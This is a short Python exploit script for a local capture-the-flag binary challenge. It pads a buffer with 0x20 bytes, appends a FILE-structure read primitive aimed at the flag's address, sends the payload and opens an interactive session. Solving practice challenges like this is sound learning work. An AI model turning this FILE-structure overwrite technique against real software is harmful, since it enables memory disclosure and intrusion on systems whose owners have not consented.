import sys
if sys.platform == 'darwin':
    sys.path.append('/Users/curious/code')
else:
    sys.path.append('/home/curious/code')

from CTFLib.all import *

r = local('./chal', '/usr/src/glibc/glibc_dbg/libc.so')

flag_addr = 0x404050
buf = 0x405000 - 0x100

payload = b'a' * 0x20 + FILE_read(flag_addr, 0x30, buf)

r.send(payload)

r.interactive()
